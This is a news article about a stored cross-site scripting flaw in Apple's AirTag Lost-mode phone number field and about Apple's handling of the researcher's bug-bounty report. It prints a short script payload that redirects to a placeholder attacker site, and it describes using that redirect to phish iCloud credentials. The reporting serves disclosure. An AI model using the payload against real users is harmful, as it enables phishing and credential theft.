@@ -1,0 +1,43 @@
+Apple forgot to sanitize the Phone Number field for lost AirTags
+Another bug-bounty boondoggle leads to public disclosure before the bug is fixed.
+JIM SALTER - 10/1/2021, 1:16 AM
+
+A plastic tag hangs from a young person's backpack.
+Enlarge / Apple's AirTags—as seen clipped to a backpack, above—allow users to attempt to find their own device via location rebroadcast from other Apple users. If all else fails, the user can enable a "Lost mode" intended to display their phone number when a finder scans the missing AirTag.
+James D. Morgan / Getty Images
+102
+WITH 74 POSTERS PARTICIPATING, INCLUDING STORY AUTHOR
+SHARE ON FACEBOOK
+SHARE ON TWITTER
+The hits keep coming to Apple's bug-bounty program, which security researchers say is slow and inconsistent to respond to its vulnerability reports.
+
+This time, the vuln du jour is due to failure to sanitize a user-input field—specifically, the phone number field AirTag owners use to identify their lost devices.
+
+The Good Samaritan attack
+AirTags are tiny, button-like devices which can be personalized with engraving and attached to easily lost devices either directly or via "loop" holders.
+Enlarge / AirTags are tiny, button-like devices which can be personalized with engraving and attached to easily lost devices either directly or via "loop" holders.
+James D. Morgan via Getty Images
+Security consultant and penetration tester Bobby Rauch discovered that Apple's AirTags—tiny devices which can be affixed to frequently lost items like laptops, phones, or car keys—don't sanitize user input. This oversight opens the door for AirTags to be used in a drop attack. Instead of seeding a target's parking lot with USB drives loaded with malware, an attacker can drop a maliciously prepared AirTag.
+
+This kind of attack doesn't need much technological know-how—the attacker simply types valid XSS into the AirTag's phone number field, then puts the AirTag in Lost mode and drops it somewhere the target is likely to find it. In theory, scanning a lost AirTag is a safe action—it's only supposed to pop up a webpage at https://found.apple.com/. The problem is that found.apple.com then embeds the contents of the phone number field in the website as displayed on the victim's browser, unsanitized.
+
+The most obvious way to exploit this vulnerability, Rauch reports, is to use simple XSS to pop up a fake iCloud login dialog on the victim's phone. This doesn't take much at all in the way of code:
+
+<script>window.location='https://path/to/badsite.tld/page.html';var a = '';</script>
+If found.apple.com innocently embeds the XSS above into the response for a scanned AirTag, the victim gets a popup window which displays the contents of badside.tld/page.html. This might be a zero-day exploit for the browser or simply a phishing dialog. Rauch hypothesizes a fake iCloud login dialog, which can be made to look just like the real thing—but which dumps the victim's Apple credentials onto the target's server instead.
+
+Although this is a compelling exploit, it's by no means the only one available—just about anything you can do with a webpage is on the table and available. That ranges from simple phishing as seen in the above example to exposing the victim's phone to a zero-day no-click browser vulnerability.
+
+More technical detail—and simple videos displaying both the vulnerability, and the network activity spawned by Rauch's exploit of the vulnerability—are available at Rauch's public disclosure on Medium.
+
+This public disclosure brought to you by Apple
+FURTHER READING
+Infosec researchers say Apple’s bug-bounty program needs work
+According to reporting from Krebs on Security, Rauch is publicly disclosing the vulnerability largely due to communication failures from Apple—an increasingly common refrain.
+Rauch told Krebs that he initially disclosed the vulnerability privately to Apple on June 20, but for three months all the company would tell him is that it was "still investigating." This is an odd response for what appears to be an extremely simple bug to verify and mitigate. Last Thursday, Apple emailed Rauch to say the weakness would be addressed in a coming update, and it asked that he not talk about it publicly in the meantime.
+
+Apple never responded to basic questions Rauch asked, such as whether it had a timeline for fixing the bug, whether it planned to credit him for the report, and whether it would qualify for a bounty. The lack of communication from Cupertino prompted Rauch to go public on Medium, despite the fact that Apple requires researchers to keep quiet about their discoveries if they want credit and/or compensation for their work.
+
+Rauch expressed willingness to work with Apple but asked the company to "provide some details of when you plan on remediating this, and whether there would be any recognition or bug bounty payout." He also warned the company that he planned to publish in 90 days. Rauch says that Apple's response was "basically, we'd appreciate it if you didn't leak this."
+
+We have reached out to Apple for comment and will update here with any reply.
